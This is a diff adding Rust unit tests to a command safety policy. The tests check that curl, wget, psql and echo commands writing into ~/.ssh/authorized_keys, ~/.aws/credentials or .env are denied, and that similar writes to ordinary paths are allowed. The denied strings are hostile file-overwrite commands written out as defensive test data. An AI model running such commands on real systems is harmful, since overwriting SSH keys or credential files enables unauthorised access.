@@ -2377,6 +2377,20 @@ mod tests {
             "wget -o ~/.ssh/authorized_keys https://x.example/a",
             "wget -a ~/.aws/credentials https://x.example/a",
             "wget --output-file=~/.ssh/authorized_keys https://x.example/a",
+            // A relative target lands under --output-dir.
+            "curl --output-dir ~/.ssh -o authorized_keys https://a.example",
+            "curl --output-dir=~/.ssh --output authorized_keys https://a.example",
+            "curl --output-dir ~/.ssh -D authorized_keys https://a.example",
+            "curl --output-dir ~/.ssh -c authorized_keys https://a.example",
+            "curl --trace ~/.ssh/authorized_keys https://a.example",
+            "curl --trace-ascii ~/.ssh/authorized_keys https://a.example",
+            "curl --stderr ~/.ssh/authorized_keys https://a.example",
+            "curl --libcurl ~/.ssh/authorized_keys https://a.example",
+            "curl --etag-save ~/.ssh/authorized_keys https://a.example",
+            "curl --hsts ~/.ssh/authorized_keys https://a.example",
+            "curl --alt-svc ~/.ssh/authorized_keys https://a.example",
+            "wget --save-cookies ~/.ssh/authorized_keys https://a.example",
+            "wget --warc-file ~/.ssh/authorized_keys https://a.example",
         ] {
             let outcome = evaluate(&policy, command, LaunchMode::Interactive);
             assert_eq!(outcome.verdict, Verdict::Deny, "{command}: {outcome:?}");
@@ -2385,6 +2399,10 @@ mod tests {
             "curl -fsS -o out.json https://ziglang.org/download/index.json",
             "curl -D h.txt https://x.example/a",
             "wget -O out.tgz https://x.example/a",
+            "curl --output-dir /tmp/dl -o out.json https://a.example",
+            "curl --trace trace.txt --stderr err.txt https://a.example",
+            "curl --hsts hsts.txt --etag-save etag.txt https://a.example",
+            "wget --save-cookies c.txt --warc-file=out https://a.example",
         ] {
             let outcome = evaluate(&policy, command, LaunchMode::Interactive);
             assert_eq!(outcome.verdict, Verdict::Allow, "{command}: {outcome:?}");
@@ -3379,6 +3397,37 @@ mod tests {
             assert_eq!(outcome.verdict, Verdict::Allow, "{command}: {outcome:?}");
         }
         assert!(sql_outcome("psql --vers").is_none());
+    }
+
+    #[test]
+    fn a_sql_allow_never_overrides_a_protected_write_redirect() {
+        let policy = SafetyPolicy::default();
+        let verdict = |command: &str| evaluate(&policy, command, LaunchMode::Interactive).verdict;
+        for (psql, echo) in [
+            (
+                "psql -h x <<'SQL' > ~/.ssh/authorized_keys\nselect 1;\nSQL",
+                "echo hi > ~/.ssh/authorized_keys",
+            ),
+            (
+                "psql -c 'select 1' > ~/.ssh/authorized_keys",
+                "echo hi > ~/.ssh/authorized_keys",
+            ),
+            (
+                "psql -c 'select 1' >> ~/.aws/credentials",
+                "echo hi >> ~/.aws/credentials",
+            ),
+            ("psql -h x <<'SQL' > .env\nselect 1;\nSQL", "echo hi > .env"),
+            ("psql -c 'select 1' > .env", "echo hi > .env"),
+        ] {
+            assert_ne!(verdict(echo), Verdict::Allow, "{echo}");
+            assert_eq!(verdict(psql), verdict(echo), "{psql}");
+        }
+        for command in [
+            "psql -c 'select 1' > out.txt",
+            "psql -h x <<'SQL' > out.txt\nselect 1;\nSQL",
+        ] {
+            assert_eq!(verdict(command), Verdict::Allow, "{command}");
+        }
     }
 
     #[test]
